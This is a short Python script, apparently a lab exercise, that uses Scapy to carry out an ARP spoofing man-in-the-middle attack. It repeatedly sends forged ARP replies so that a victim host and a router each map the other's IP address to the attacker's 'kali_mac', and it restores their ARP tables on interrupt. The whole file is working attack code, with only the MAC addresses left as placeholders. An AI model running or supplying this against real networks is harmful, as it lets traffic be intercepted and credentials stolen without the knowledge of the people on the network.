from scapy.all import *
import time

arp_packet = ARP()

def spoof_victim():
  arp_packet.op = 2
  arp_packet.pdst = "1.1.1.7" # victim ip
  arp_packet.hwdst = "victim_mac"
  
  arp_packet.hwsrc = "kali_mac"
  arp_packet.psrc = "1.1.1.2" # router ip
  
  send(arp_packet)
  
def spoof_router():
  arp_packet.op = 2
  arp_packet.pdst = "1.1.1.2" # router ip
  arp_packet.hwdst = "router_mac"
  
  arp_packet.hwsrc = "kali_mac"
  arp_packet.psrc = "1.1.1.7" # victim ip
  send(arp_packet)

def restore():
  # restoring victim table
  arp_packet.op = 2
  arp_packet.pdst = "1.1.1.7" # victim ip
  arp_packet.hwdst = "victim_mac"
  
  arp_packet.hwsrc = "router_mac"
  arp_packet.psrc = "1.1.1.2" # router ip
  
  send(arp_packet)
  
  # restoring router table
  arp_packet.op = 2
  arp_packet.pdst = "1.1.1.2" # router ip
  arp_packet.hwdst = "router_mac"
  
  arp_packet.hwsrc = "victim_mac"
  arp_packet.psrc = "1.1.1.7" # victim ip
  send(arp_packet)

if __name__ == "__main__":
    try:
        while True:
            spoof_victim()
            spoof_router()
            time.sleep(2)
    except KeyboardInterrupt as err:
        print("\nRestoring ARP table")
        restore()
        print("Exiting...")
    
    
